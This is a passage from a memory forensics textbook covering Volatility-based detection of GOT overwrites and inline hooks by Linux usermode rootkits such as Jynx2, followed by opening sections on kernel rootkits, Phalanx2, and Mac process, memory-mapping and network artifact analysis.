You have already learned how to read and write a process’ memory with `ptrace`. You also know that you can use `dlopen` and `dlsym` to find the address of any exported function within a module. The only thing that has not been covered yet is locating the GOT entry of the target function. To find this information, you can query the relocation table. Each relocation entry lists the address of a resolved function within the GOT. For more information, use the `readelf` command with the `-r` parameter (which causes relocation information to be displayed). Here’s an example:

```
1   $ readelf -W -r test_app
2
3   Relocation section '.rel.dyn' at offset 0x324 contains 1 entries:
4   Offset     Info    Type                Sym. Value  Symbol's Name
5   08049838  00000506 R_386_GLOB_DAT         00000000   __gmon_start__
6
7   Relocation section '.rel.plt' at offset 0x32c contains 8 entries:
8   Offset     Info    Type                Sym. Value  Symbol's Name
9   08049848  00000107 R_386_JUMP_SLOT        00000000   strstr
10  0804984c  00000207 R_386_JUMP_SLOT        00000000   read
11  08049850  00000307 R_386_JUMP_SLOT        00000000   perror
12  08049854  00000407 R_386_JUMP_SLOT        00000000   puts
13  08049858  00000507 R_386_JUMP_SLOT        00000000   __gmon_start__
14  0804985c  00000607 R_386_JUMP_SLOT        00000000   exit
15  08049860  00000707 R_386_JUMP_SLOT        00000000   open
16  08049864  00000807 R_386_JUMP_SLOT        00000000   __libc_start_main
```

In this output, the entries of type `R_386_JUMP_SLOT`(lines 9–16) represent imported functions. The `Offset` column tells you the address of the GOT entry for the function. By reading from this address, you can determine the runtime address of each function whose name is given in the `Symbol's Name` column.

### Detecting GOT Overwrites

Detecting GOT overwrites is typically a four-step process:

1. Walk the dynamic linking information of the application and all loaded libraries.
2. Record the resolved address and symbol name for all functions within the relocation tables. For libraries that are lazily loaded, the symbol addresses are not resolved until the function is actually called. Lazy loading can mean that some GOT entries will point inside the containing ELF object, which makes filtering out such entries easy.
3. Identify the libraries that the application *need*s. These libraries are determined at compile time and stored as `DT_NEEDED` entries within the dynamic linking information.
4. Validate each resolved GOT entry by checking that the resolved address points into one of the needed libraries. This validation process ensures that the function points into one of the libraries that the program was linked with at compile time.

The following shows the output of the Volatility GOT/PLT overwrite plugin, `linux_plthook`. In this case, the plugin is used to analyze a Secure Shell (SSH) server process infected by the Jynx2 rootkit:

```
$ python vol.py --profile=LinuxDebian3_2x86 -f preload.lime 
   linux_plthook -p 22996 
Volatility Foundation Volatility Framework 2.4
Task  ELF Start  ELF Name        Symbol         Resolved Address Target Info
22996 0x08048000 /usr/sbin/sshd  __xstat64      0x000000b7743fc9 /root/jynx2.so 
22996 0x08048000 /usr/sbin/sshd  write          0x000000b774327a /root/jynx2.so 
22996 0x08048000 /usr/sbin/sshd  fopen64        0x000000b7742f32 /root/jynx2.so 
22996 0x08048000 /usr/sbin/sshd  __lxstat64     0x000000b7743930 /root/jynx2.so 
22996 0x08048000 /usr/sbin/sshd  opendir        0x000000b7744432 /root/jynx2.so 
22996 0x08048000 /usr/sbin/sshd  accept         0x000000b7742bf0 /root/jynx2.so 
22996 0x08048000 /usr/sbin/sshd  readdir64      0x000000b7744660 /root/jynx2.so 
22996 0x08048000 /usr/sbin/sshd  unlink         0x000000b77440d9 /root/jynx2.so 
22996 0x08048000 /usr/sbin/sshd  rmdir          0x000000b7743b5c /root/jynx2.so 
22996 0x08048000 /usr/sbin/sshd  __fxstat64     0x000000b7743532 /root/jynx2.so
```

Several functions within the SSH server’s GOT redirect to addresses within the Jynx shared library. You can use this same approach to generically detect all `LD_PRELOAD` rootkits (which automatically overwrite GOT entries) as well as those that manually overwrite GOT entries.

---

**NOTE**

Georg Wicherski developed the `linux_plthook` plugin to assist with one of his investigations. In this case, he encountered an advanced piece of malware that operated only in memory and used GOT/PLT overwrites to control infected systems. You can find more information on Georg’s analysis of this infection in his SysScan 2014 presentation, *Linux Memory Forensics: A Real-Life Case Study* (see [http://syscan.org/index.php/download/get/7d8da2be5feac35e006f618beda71459e7/SyScan2014_SPEAKER13.zip](http://syscan.org/index.php/download/get/7d8da2be5feac35e006f618beda71459e7/SyScan2014_SPEAKER13.zip)).

---

## Inline Hooking

Instead of replacing function pointers, such as those in the GOT, an inline hook overwrites the first several bytes of a function and replaces them with instructions of the malware’s choosing. These instructions normally redirect control flow to a function the malware places in memory. Malware authors frequently choose inline hooking as opposed to GOT tampering because on hardened Linux systems, the GOT is marked read-only (`RELRO`) after the process is first loaded (see [https://isisblogs.poly.edu/2011/06/01/relro-relocation-read-only](https://isisblogs.poly.edu/2011/06/01/relro-relocation-read-only)).

The `linux_apihooks` plugin detects inline hooks by first gathering the list of functions an application uses in the same manner as `linux_plthook`. It then disassembles the first several instructions of each function, looking for control flow transfers such as `CALL`, `JMP`, or `RET` instructions that point outside the current library.

In the following output, you can see `linux_apihooks` detecting a malware sample that hooks several functions within `libc`:

```
$ python vol.py -f hooks.lime --profile=LinuxDebian-3_2x64 
    linux_apihooks -p 65033
Volatility Foundation Volatility Framework 2.4
Hook VMA                   Hooked Symbol Symbol Address Type  Hook Address
------------------------   ----------    -------------  ----- --------------
/lib/<snip>/libc-2.13.so   write         0x7ff29b512c06 JMP   0x7ff31c069a45
/lib/<snip>/libc-2.13.so   close         0x7ff29b512c46 JMP   0x7ff31c069a96
/lib/<snip>/libc-2.13.so   read          0x7ff29b512c56 JMP   0x7ff31c068e45
/lib/<snip>/libc-2.13.so   open          0x7ff29b512ca6 JMP   0x7ff31c069d13
/lib/<snip>/libc-2.13.so   accept        0x7ff29b512cb6 JMP   0x7ff31c069c57
/lib/<snip>/libc-2.13.so   socket        0x7ff29b512bb0 JMP   0x7ff31c069043
```

Based on the functions hooked (`write`, `close`, `read`, `open`, `accept`, and `socket`), you can surmise that the malware is likely trying to hide file system and network activity. Because file handles and network sockets are both just file descriptors in Linux, hooking the chosen functions can simultaneously control both file system interaction and network connections made by affected userland processes. To further investigate the purpose of the hooks, you can follow the address in the `Hook Address` column in `volshell` or dump the containing memory range (`linux_dump_maps`) to disk for static analysis.

## Summary

Understanding how Linux processes interact with operating system resources (system calls, the file system, network, shared libraries, and so on) is critical to detecting usermode rootkits. Numerous powerful rootkits have been seen in both proof-of-concept and fully weaponized forms—a trend that won’t stop anytime soon. Luckily, memory forensics gives you an equally powerful mechanism to analyze systems for signs of code injection, overwritten GOT entries, inline function hooks, and even the most subtle of environment variable modifications.
# Chapter 26 Kernel Mode Rootkits

Kernel mode rootkits are extremely dangerous to the runtime integrity of a Linux system. These rootkits have the power to add, delete, or modify any data that kernel or userland applications request about the state of the system. This can include information such as lists of running processes, loaded kernel modules, active network connections, files within a directory, and even the contents of those files. Kernel mode rootkits can also monitor user activity including keystrokes, network packets, and interactions with hardware such as removable media or security devices. To find kernel mode rootkits, you must perform deep inspection of the running kernel, including its code and data structures.

Kernel rootkits can hook many places to subvert the system, and accordingly, Volatility has powerful support for enumerating and verifying in-kernel data. Many of these are newly developed capabilities and exclusive to Volatility, such as finding Netfilter hooks and copied credential structures. Throughout this chapter, you’ll see several of these plugins in action and you’ll learn how to use them in your own investigations.

## Accessing Kernel Mode

To install and use a kernel mode rootkit, attackers must first obtain root-level privileges. They can gain access to this permission level either through a social engineering attack (e.g., convincing an administrator to install a malicious application) or by remotely exploiting a network service that runs with ...
# Chapter 27 Case Study: Phalanx2

Phalanx2 (P2) is a sophisticated Linux kernel rootkit discovered during a number of high-profile incidents involving some of the world’s most sensitive networks. Not only does P2 try to hide from common system administration tools running on live systems, but it also includes capabilities to frustrate reverse engineering and memory forensics. Of the Linux kernel rootkits that have been discussed publicly, P2 is by far the most advanced one that we have seen and analyzed.

This chapter takes you through a deep analysis of a number of interesting components of P2. This analysis also demonstrates how memory forensics can be combined with static analysis, dynamic reverse engineering, and baseline comparison techniques to analyze even the most sophisticated Linux rootkits.

## Phalanx2

P2 is often considered an infamous Linux kernel rootkit due to the number of high-profile investigations in which it was encountered. It is also very difficult to detect using common system administration and live forensics tools. To accomplish this, P2 employs a mix of function pointer overwrites and system call hooks to hide its files, processes, and network connections. As a result, nearly all host monitoring and integrity checking systems cannot identify compromised systems.

The source code of the original version of Phalanx was leaked to Packetstorm in 2005 ([http://packetstormsecurity.com/files/42556/phalanx-b6.tar.bz2.html](http://packetstormsecurity.com/files/42556/phalanx-b6.tar.bz2.html)). Since that time, there have been no further ...
# IV  
 Mac Memory Forensics

- Chapter 28: Mac Acquisition and Internals
- Chapter 29: Mac Memory Overview
- Chapter 30: Malicious Code and Rootkits
- Chapter 31: Tracking User Activity
# Chapter 28 Mac Acquisition and Internals

The proliferation of systems running Mac OS X in both home and corporate environments has resulted in Mac systems being a focus of targeted attacks. Driven by these factors, the forensics community has worked to develop tools for Mac systems that are on par with the robust investigative capabilities currently available for Windows and Linux systems. To prepare you for Mac memory forensics, this chapter introduces some of the unique facets of the Mac operating system, such as 64-bit addressing on 32-bit kernels, the atypical userland and kernel address space layouts, and the use of microkernel components. Additionally, you’ll learn how to build Volatility profiles for Mac systems and which tools to use for memory acquisition.

**NOTE**

Part IV of this book focuses heavily on in-memory artifacts of Mac systems. If you would like to learn about advances in Mac disk forensics and malware anaysis, we suggest reading the presentations indexed on Sarah Edwards’ website ([http://mac4n6.com/](http://mac4n6.com/)).

## Mac Design

If you read Part III, “Linux Memory Forensics,” you are now very familiar with how Linux was designed and organized in both the kernel and userland. As you will soon see, Mac is very similar to Linux because it is heavily based on Berkeley Software Distribution (BSD). Both BSD and Linux were influenced by the initial designs and philosophies of Unix. The similarities between these operating systems result in a substantially smaller learning curve ...
# Chapter 29  
 Mac Memory Overview

This chapter introduces a wide range of topics related to Mac memory forensics, including process analysis, recovery of cached files from memory, finding historical artifacts, and locating and extracting loaded kernel extensions. This chapter also highlights the similarities between analyzing Mac and Linux systems. Because these systems are both based on UNIX, our goal with this chapter is to introduce Mac-specific data structures and constructs without repeating information found in the Linux chapters. This chapter concludes with utilities that you can use to conduct live forensics of Mac systems. If you are familiar with performing live analysis on Linux, there might be a bit of a learning curve because many of the normal tools and techniques are not directly applicable to Mac OS X.

## Mac versus Linux Analysis

In Part III of the book, which discusses Linux forensics analysis, we cover a number of Volatility plugins, data structures, algorithms, rootkit techniques, detection capabilities, and other essential topics for when you perform memory forensics on Linux systems. As you will learn, Mac and Linux share many similarities, including adherence to the Portable Operating System Interface (POSIX) standard, which greatly influences operating system design, as well as the use of libc, bash, and other libraries and applications that are the foundation of the respective operating systems. Due to the great number of similarities and overlapping codebases, many of the analysis techniques and plugins you used on Linux memory samples are applicable on Mac systems. To aid with this transition, many of the Mac plugins are named the same as their Linux counterparts—with the `linux` prefix changed to `mac`.

In addition to memory forensics, this chapter includes a comparison of live forensics approaches for Linux and Mac. Even though live forensics is not a replacement for full memory forensics, it does have its uses, such as when you cannot acquire physical memory or when you want to build a dataset to cross-reference with the output of your memory forensics framework. This cross-referencing serves two purposes:

- To verify that your memory forensics tool produces correct results
- To find artifacts that a rootkit might be hiding from the live system

Although memory forensics can certainly find evidence of rootkit activity within a memory dump, without training and experience it might not be clear what effects the rootkit activity would have on the live system. The results of a live forensics investigation can help to quickly fill this knowledge gap.

## Process Analysis

The ability to locate and analyze process structures is a fundamental component of memory forensics. Once you find a process of interest, you can examine it to uncover memory maps, opened file descriptors, active network connections, and more. In this section, you learn how to recover processes using a number of methods as well as how to recognize abnormal process relationships.

---

## **Analysis Objectives**

Your objectives are these:

- **Understand the Mach and BSD split related to processes**: As you learned in Chapter 28, the Mac design includes both the Mach and BSD layers. These layers divide responsibilities in a way that requires multiple data structures to track each process.
- **Locate processes using multiple sources**: Kernel rootkits have the capability to hide processes from one or more kernel sources to mislead system administrators and live tools. Through memory forensics, you can enumerate processes in many ways and cross-reference them to find processes that were hidden on the live system.
- **Understand common parent/child process relationships**: A strong indicator of compromise is when processes are spawned by the wrong parent process. On Windows, it can be a `cmd.exe` spawned by Adobe Reader, and on Linux it can be a `netcat` instance running under Firefox. In this section, you learn the normal relationships of processes on Mac to help spot such anomalies.

## **Data Structures**

The `proc` structure tracks processes throughout the Mach layer.

```
>>> dt("proc")
'proc' (1192 bytes)
0x0   : p_list                         ['__unnamed_17118569']
0x10  : p_pid                          ['int']
0x18  : task                           ['pointer', ['task']]
0x20  : p_pptr                         ['pointer', ['proc']]
<snip>
0x30  : p_uid                          ['unsigned int']
0x34  : p_gid                          ['unsigned int']
<snip>
0x80  : p_sibling                      ['__unnamed_17118939']
0x90  : p_children                     ['__unnamed_17118990']
<snip>
0xe0  : p_fd                           ['pointer', ['filedesc']]
<snip>
0x2a0 : p_argslen                      ['unsigned int']
0x2a4 : p_argc                         ['int']
<snip>
0x2d4 : p_comm                         ['String', {'length': 17}]
0x2e5 : p_name                         ['array', 33, ['char']]
<snip>
```

The `task` structure tracks tasks throughout the BSD layer.

```
>>> dt("task")
'task' (960 bytes)
<snip>
0x20  : map                            ['pointer', ['_vm_map']]
0x28  : tasks                          ['queue_entry']
<snip>
0x40  : threads                        ['queue_entry']
<snip>
0x2f0 : bsd_info                       ['pointer', ['void']]
<snip>
0x308 : all_image_info_addr            ['unsigned long long']
0x310 : all_image_info_size            ['unsigned long long']
```

## **Key Points**

The key points for the `proc` structure are these:

- `p_list`: The process' linkage into the global list of running processes.
- `p_pid`: The process ID (PID).
- `task`: A pointer to the associated `task` structure in the BSD layer for this process.
- `p_pptr`: A pointer to the process' parent process.
- `p_uid` and `p_gid`: The user and group ID that the process started as.
- p_sibling and `p_children`: The list of processes started by the same parent process and spawned by this process. They build the parent/child relationship of processes generated by the `mac_pstree` plugin.
- `p_fd`: The file descriptor table of the process.
- `p_argslen` and `p_argc`: The number and length of the process' command-line arguments. It is used by the `mac_psaux` plugin.
- `p_comm` and `p_name`: The ASCII and Unicode name of the process.

- The key points for the `task` structure are these:

- `map`: The list of memory mappings.
- `tasks`: The task’s linkage into the global list of active tasks.
- `threads`: The threads of this task.
- `bsd_info`: A back pointer to the owning process (struct `proc`) of this task.
- `all_image_info_addr` and `all_image_info_size`: Store the address and size of the information that `dyld` (the dynamic loader) keeps on libraries loaded into the process. Later in this chapter, you’ll use them to examine the shared cache map.

---

### Enumerating Processes

The `mac_psxview` plugin can enumerate processes from Mac memory samples using several methods. The following output shows an example:

```
$ python vol.py --profile=MacMountainLion_10_8_3_AMDx64 
     -f 10.8.3x64.vmem mac_psxview
Volatility Foundation Volatility Framework 2.4 
Offset(V)          Name        PID  pslist parents pidhash  pgroup sleads tasks
------------------ ----------- ---- -----  ------- -------  ------ ------ ------
0xfffffc80f029ada2d0 kernel_task    0 True   True    False    True   True   True
0xffffff803012ca60 launchd        1 True   True    True     True   True   True
0xffffff803012bd40 kextd         12 True   False   True     True   True   True
0xffffff803012b480 taskgated     13 True   False   True     True   True   True
0xffffff803012b020 notifyd       14 True   False   True     True   True   True
0xffffff803012a760 securityd     16 True   False   True     True   True   True
0xffffff803012a300 configd       17 True   False   True     True   True   True
<snip>
0xffffff803345b480 bash         204 True   True    True     True   False  True
0xffffff803109a480 sudo         209 True   True    True     True   False  True
0xffffff8031098a40 dtrace       210 True   False   True     True   False  True
0xffffff80329a4a60 launchd      213 True   True    True     True   True   True
0xffffff803345c1a0 distnoted    216 True   False   True     True   False  True
0xffffff803345a760 cfprefsd     217 True   False   True     True   False  True
0xffffff803345a300 login        218 True   True    True     True   True   True
```

For each process, the virtual offset, name, and PID are printed along with True/False indicators that tell you from which source(s) each process was found. The following list describes the enumeration methods:

- **pslist**: Enumerates processes by walking the active process list linked within each `proc` structure. This column is generated through the `mac_pslist` plugin.
- **parents**: Walks the process list using `mac_pslist` and records the parent process for each process. To see the parent and children process of each process, use the `mac_pstree` plugin.
- **pidhash:** Walks the `pidhashtbl` global hash table of processes. This column is generated through the `mac_pid_hash_table` plugin.
- **pgroup**: Walks the `pgrphashtbl` global hash table of processes. This column is generated through the `mac_pgrp_hash_table` plugin.
- **sleads**: Enumerates the session leader process of each session. The list of sessions is generated through the `mac_list_sessions` plugin.
- **tasks**: Walks the global list of `task` structures and records the back pointer contained in the `bsd_info` member.

The purpose of the `mac_psxview` plugin is to enumerate processes using many methods to uncover hidden ones. As we present in Chapter 30, it successfully finds the process-hiding techniques employed by all known Mac rootkits. While studying the output of this plugin, be aware that some processes have `False` indicators, even though they are not malicious or hidden. A few benign `False` indicators that you commonly see are the following:

- The `kernel_task` process never appears in the `pid_hash` column.
- Many processes are `False` in the `parents` column, which occurs because only processes that spawn other processes are parent processes. For example, applications, such as text editors, PDF readers, and chat clients rarely spawn other processes, and as such do not appear in the `parents` column.
- Many processes are `False` in the `sleads` column. It occurs because only processes that lead session groups, such as `login`, are in this list. **NOTE** Sessions are a UNIX (Linux, BSD) concept that allows grouping multiple processes into a higher-level set, similar to Job objects in Windows. The purpose of these process sets is to efficiently manage signal handling. Because you can have only one leader per session, many processes are absent from the session leaders list.

### Process Relationships

You can use the `mac_pstree` plugin to visualize the parent/child relationship between processes. The following output is `mac_pstree` against a clean 64–bit Mountain Lion system:

```
$ python vol.py --profile=MacMountainLion_10_8_3_AMDx64 
   -f 10.8.3x64.vmem mac_pstree
Volatility Foundation Volatility Framework 2.4 
Name                 Pid             Uid
kernel_task          0               0
.launchd             1               0
..launchd            213             89
...mdworker          227             89
...cfprefsd          217             89
...distnoted         216             89
..coresymbolicatio   211             0
..com.apple.audio.   203             202
<snip>
..launchd            133             501
...Terminal          199             501
....login            218             0
.....bash            219             501
......sudo           222             0
.......dtrace        223             0
<snip>
...iTunesHelper      175             501
...vmware-tools-dae  170             501
...assistantd        167             501
...CalendarAgent     166             501
```

In this plugin’s output, `kernel_task` is the parent of all processes, so it appears at the root of the tree. During startup, `kernel_task` spawns the first userland process, which is the initial `launchd` with a PID of 1. This `launchd` is the parent of all future userland processes. Soon after the master `launchd` process is started, another `launchd`, PID 213 in the sample output, is started to handle the system daemons. Later, after a user logs in, a new launch daemon (PID 133) is spawned to handle the session.

In this session, the user launched the `Terminal` app, which created the `login` script, which then started `bash`. Once inside `bash`, the user elevated to root through `sudo` and then ran `dtrace`. You can tell that the user moved from a non-root user to root because the bash process (PID 219) started with the user ID (UID) of 501 and then `dtrace` runs with UID 0 after being spawned by `sudo`.

## Address Space Mappings

The mappings within the address space of a process can provide immensely useful information during an investigation, including the recovery of a process' heap, stack, application binary, shared libraries, mapped files, and more. To recover this information and make use of it, you must first understand how it is stored in memory along with some Mac-specific constructs.

---

## **Analysis Objectives**

Your objectives are these:

- **Learn Mac’s algorithms for memory mappings**: Mac has several unique features relating to its process memory mappings, including the use of bundles, library caches, and submappings. You will learn about these and how to analyze them to produce full mappings of data within a process' address space.
- **Understand the dynamic loader’s shared cache**: The shared library cache is a memory loading mechanism that has no counterpart on Windows and Linux. To effectively analyze a process' memory mappings, not only must you consult the kernel’s data structures but you must also consult those of `dyld`.

## **Data Structures**

The `_vm_map` structure represents a memory mapping within a process' address space:

```
>>> dt("_vm_map")
'_vm_map' (240 bytes)
0x0   : lock                           ['_lck_rw_t_internal_']
0x10  : hdr                            ['vm_map_header']
0x50  : pmap                           ['pointer', ['pmap']]
<snip>
```

The `vm_map_header` structure holds the initial link of process mappings:

```
>>> dt("vm_map_header")
'vm_map_header' (64 bytes)
0x0   : links                          ['vm_map_links']
0x20  : nentries                       ['int']
```

The `vm_map_links` structure stores the starting and ending address of each mapping, along with pointers to the rest of the mappings:

```
>>> dt("vm_map_links")
'vm_map_links' (32 bytes)
0x0   : prev                           ['pointer', ['vm_map_entry']]
0x8   : next                           ['pointer', ['vm_map_entry']]
0x10  : start                          ['unsigned long long']
0x18  : end                            ['unsigned long long']
```

The `vm_map_entry` structure holds the information required to recover the file path and contents of file-backed mappings:

```
>>> dt("vm_map_entry")
'vm_map_entry' (80 bytes)
<snip>
0x38  : object                         ['vm_map_object']
0x40  : offset                         ['unsigned long long']
<snip>
```

The `vm_map_object` structure holds information about the mapping’s submap or the file it maps:

```
>>> dt("vm_map_object")
'vm_map_object' (8 bytes)
0x0   : sub_map                        ['pointer', ['_vm_map']]
0x0   : vm_object                      ['pointer', ['vm_object']]
```

## **Key Points**

The key points for the `_vm_map` structure are these:

- `hdr`: A pointer to the beginning of the virtual memory maps for the process.
- `pmap`: A pointer to the physical memory maps of the process. You can use them to find the physical pages backing the maps' virtual addresses.

The key points for the `vm_map_header` structure are these:

- `links`: The head of the list of memory maps
- `nentries`: The number of memory maps

The key points for the `vm_map_links` structure are these:

- `next`and `prev`: The forward and backward pointers to the other memory maps of the process
- `start` and `end`: The starting and ending virtual address of the mapping within the process' address space

The key points for the `vm_map_entry` structure are these:

- `object`: The backing object of the map for file-backed mappings. It holds the information necessary to recover the path of the mapped file as well as its contents.
- offset: The offset of the mapping within the mapped file. This offset is *page aligned*, which means that even if a particular data structure is in the middle of a page, the offset points to the beginning of the containing page. Mach-O files are normally compiled so that the header is followed by the code segments and data segments. The code mapping starts at offset 0 of the file because the beginning of the code section is within the same page as the header, but the data mapping is at a non-zero offset within the file.

The key points for the `vm_map_object`structure are these:

- `sub_map`: Information for submappings of a particular map. This concept is explained in detail later in this section.
- `vm_object`: The structure that holds information about the mapped file. This topic is explored in more detail later in this chapter when you recover files cached in memory.

---

### Listing and Recovering Mappings

The `mac_proc_maps` plugin can be used to list process memory mappings. Here’s an example of finding the PID of the `iTunesHelper` process and then listing its memory maps:

```
$ python vol.py -f 10.9.1.vmem --profile=MacMavericks_10_9_1_AMDx64 mac_pslist
Volatility Foundation Volatility Framework 2.4 
Offset             Name         Pid  Uid Gid PGID Bits  DTB        
-----------------  ------------ ---  --- --- ---- ----  ---------- 
0xffffff800d939098 iTunesHelper 223  501 20  223  64BIT 0x44238000 
<snip>

$ python vol.py -f 10.9.1.vmem --profile=MacMavericks_10_9_1_AMDx64 
      mac_proc_maps -p 223
Name          Start           End           Perms Map Name
------------- ------------- --------------  ----- -----------
iTunesHelper  0x100000000     0x100024000    r-x  <snip>/iTunesHelper
iTunesHelper  0x100024000     0x100026000    rw-  <snip>/iTunesHelper
iTunesHelper  0x100026000     0x100028000    rw-
iTunesHelper  0x100028000     0x100030000    r--  <snip>/iTunesHelper
iTunesHelper  0x100030000     0x100031000    r--
iTunesHelper  0x100031000     0x100032000    r--
iTunesHelper  0x100032000     0x100033000    rw-
<snip>
iTunesHelper  0x7fff662ac000  0x7fff662c00e000 r-x  Macintosh HD/usr/lib/dyld
iTunesHelper  0x7fff662c00e000  0x7fff662c20e000 rw-  Macintosh HD/usr/lib/dyld
iTunesHelper  0x7fff662c20e000  0x7ffc66f031f000 rw-
iTunesHelper  0x7ffc66f031f000  0x7fff66333000 r--  Macintosh HD/usr/lib/dyld
iTunesHelper  0x7fff70000000  0x7fff70a40000 r--  sub_map
iTunesHelper  0x7fff70a40000  0x7fff70c00000 rw-  <snip>dyld_shared_cache_x86_64
iTunesHelper  0x7fff70c00000  0x7fff70e00000 rw-  <snip>dyld_shared_cache_x86_64
<snip>
iTunesHelper  0x7fff73200000  0x7fff73249000 rw-  <snip>dyld_shared_cache_x86_64
iTunesHelper  0x7fff73249000  0x7fff80000000 r--  sub_map
iTunesHelper  0x7fff80000000  0x7fffc0000000 r--  sub_map
iTunesHelper  0x7fffc0000000  0x7fffffe00000 r--  sub_map
<snip>
```

In the output, the plugin lists the target PID and process name along with the starting and ending address of each mapping, the permissions, and map name (if any). The last three lines list the region as `sub_map` instead of an actual file path, which occurs because Mac groups files that are shared between processes into a submap so that it can efficiently manage them with respect to memory consumption. You will see an example of a common submap when we discuss the `dyld` shared cache.

To recover memory mappings from a process, you can use the `mac_dump_maps` plugin. To control which mappings are written to disk you can filter by process using the `-p/--pid` flag and filter by the starting address of the map of interest using the `-s/--map-address` flag. In the following output, we extract the mapping of the text segment of the `iTunesHelper` application:

```
$ python vol.py -f 10.9.1.vmem --profile=MacMavericks_10_9_1_AMDx64
       mac_dump_maps -p 223 -s 0x100000000 -D dumpdir
Volatility Foundation Volatility Framework 2.4 
Task VM Start    VM End      Length  Path
---- ----------- ----------- ------- ---------------
 223 0x100000000 0x100024000 0x24000 dumpdir/task.223.0x100000000.dmp
```

The recovered mapping is written to the specified directory. After extraction, you can then scan the recovered memory mappings with AV signatures, Yara rules, and other scanners. Note that we dumped only a portion of the mapped executable (the text segment). In Chapter 30, you learn how to recover the mapped file as a Mach-O file that you can load into IDA Pro for static analysis.

### Dynamic Loader Shared Cache

If you examine the `mac_proc_maps` output in the previous section, you’ll notice three sub maps towards the end of the output. The largest of these, which starts at `0x7fff80000000` and is 1GB in size, corresponds to the dynamic loader’s shared cache that is mapped into each process. The dynamic loader uses this cache to contiguously load a number of core and commonly used shared libraries into each process on startup. Sharing this cache across processes saves a significant amount of physical memory pages. It also provides substantial performance gains versus mapping the libraries at every process startup.

However, submaps cause a problem with memory forensics because they do not correspond to files on disk, and as such, there is no information within the kernel to tell us which libraries are mapped inside of the 1GB space. For instance, if you search for `.dylib` files (shared libraries) in the previous list of process mappings, none appear:

```
$ python vol.py -f 10.9.1.vmem --profile=MacMavericks_10_9_1_AMDx64 
     mac_proc_maps -p 223 | grep dylib
Volatility Foundation Volatility Framework 2.4
$
```

Even though the `iTunesHelper` application is dynamically linked, none of the dynamic link libraries it uses appear in the kernel’s mapping data structures. This is because the submap is managed by `dyld`. As such, the only way to determine the contents of the 1GB range is to consult the data structures of `dyld` stored within process memory.

The previously discussed `all_image_info_addr` member of the `task` structure provides the address of where this `dyld` data structure begins. The data structure stored at this address is a `dyld_all_image_infos` structure whose `infoArray` array member points to an `infoArrayCount` number of `dyld_image_info` structures. Each `dyld_image_info` structure contains the load address of the corresponding Mach-O file and the full path to the file on disk for its mapped library. The `mac_dyld_maps` plugin can find and enumerate the dynamic loader’s set of executable mappings, as shown here:

```
$ python vol.py -f 10.9.1.vmem --profile=MacMavericks_10_9_1_AMDx64 
     mac_dyld_maps -p 223
Volatility Foundation Volatility Framework 2.4 
Pid      Name                 Start              Map Name
-------- -------------------- ------------------ --------
223      iTunesHelper         0x0000000100000000 <snip>/iTunesHelper
223      iTunesHelper         0x00007fff82aec000 
/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit
223      iTunesHelper         0x00007fff83db2000 
/System/Library/Frameworks/Carbon.framework/Versions/A/Carbon
223      iTunesHelper         0x00007fff811fa000 
/System/Library/Frameworks/DiskArbitration.framework/Versions/A/DiskArbitration
223      iTunesHelper         0x00007fff89ecd000 
/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation
223      iTunesHelper         0x00007fff88928000 /usr/lib/libobjc.A.dylib
223      iTunesHelper         0x00007fff867c5000 /usr/lib/libstdc++.6.dylib
223      iTunesHelper         0x00007fff82015000 /usr/lib/libSystem.B.dylib
<snip>
```

The plugin lists the starting address from which the executable is mapped along with its full path on disk. Even though `mac_proc_maps` cannot find any of these libraries, the unfiltered output of `mac_dyld_maps` produces information on several libraries loaded into the process. They are all part of the `dyld` cache. If you study the start address of each loaded library, you notice that they are all within the range of the previously shown 1GB submap.

Understanding the purpose of the `dyld` cache is crucial during Mac process memory analysis because it contains the memory addresses of all the core libraries. So in order to check for API hooks and code overwrites, you must use the `dyld` structures instead of looking at the kernel data structures. Similarly, if your memory forensics tool indicates that a hook was placed within the mapped region, all you would know from `mac_proc_maps` is that the hook is within an anonymous 1GB submap. If you cannot map the hook back to the actual library and function, this will greatly hinder your analysis capabilities.

## Networking Artifacts

The ability to recover information about network activity on the target system can provide a wealth of forensic evidence. Such data commonly includes command and control servers that malware contacts, the IP address that attackers use to connect to the compromised system, and the IP addresses of systems targeted during lateral movement.

---

## **Analysis Objectives**

Your objectives are these:

- **Associate network activity with a specific process**: In many investigations, the initial indicator of compromise is when you receive alerts about a system beaconing out to known bad IPs or an attacker using a compromised system for lateral movement. By utilizing these types of network indicators, which will include the source and destination IP addresses and ports, you can tie the malicious activity back to a specific process.
- **Gather network connections from multiple sources**: The OS X kernel provides several data structures that enable the enumeration of active network connections. Knowing the differences between the enumeration techniques can help you determine the origin of a connection (process or kernel driver).
- **Classify network activity**: Once you have gathered information about the network activity of a system, you then need to determine which, if any, connections were malicious. Thus, this section illustrates Mac-centric network activity that you will commonly see the operating system and its stock applications performing.

## **Data Structures**

Each network connection is represented by a struct `socket`:

```
>>> dt("socket")
'socket' (880 bytes)
0x0   : so_zone                        ['int']
0x4   : so_type                        ['short']
0x8   : so_options                     ['unsigned int']
0xc   : so_linger                      ['short']
0xe   : so_state                       ['short']
0x10  : so_pcb                         ['pointer', ['void']]
0x18  : so_proto                       ['pointer', ['protosw']]
```

The socket protocol and state are stored in a `protosw` structure:

```
>>> dt("protosw")
'protosw' (160 bytes)
0x0   : pr_type                        ['short']
0x4   : pr_domain                      ['pointer', ['domain']]
0xc   : pr_protocol                    ['short']
```

The source and destination IP address and port information for IPv4 and IPv6 sockets are stored in an `inpcb` structure:

```
>>> dt("inpcb")
'inpcb' (392 bytes)
<snip>
0x7c  : inp_dependfaddr                ['__unnamed_11443658']
0x8c  : inp_dependladdr                ['__unnamed_11443712']
<snip>
```

## **Key Points**

The key points for struct `socket` are these:

- `so_state`: The state of the connection (e.g., ESTABLISHED, LISTENING). It is currently applicable only to TCP because it is the only protocol analyzed that maintains state.
- `so_pcb`: An opaque pointer to the protocol control block for the socket. For IPv4 and IPv6 connections, it is of type `inpcb`.

The key points for struct `protosw` are these:

- `pr_domain`: The socket domain of the socket. For common sockets such as TCP and UDP, it is AF_INET.
- `pr_protocol`: The socket protocol, such as TCP, UDP, UNIX, or RAW.

The key points for struct `inpcb` are these:

- `inp_dependfaddr`: The foreign (remote) IP address and port of the connection
- `inp_dependladdr`: The local IP address and port of the connection

---

#### Process File Descriptors

The `mac_netstat` plugin can recover network connections on a per-process basis. It operates by inheriting from `mac_lsof` to receive each file descriptor of analyzed processes. It then filters for descriptors of type `DTYPE_SOCKET`. These descriptors are then converted to a `socket` structure and examined. The following shows `mac_netstat` on a clean 10.8.3 system:

```
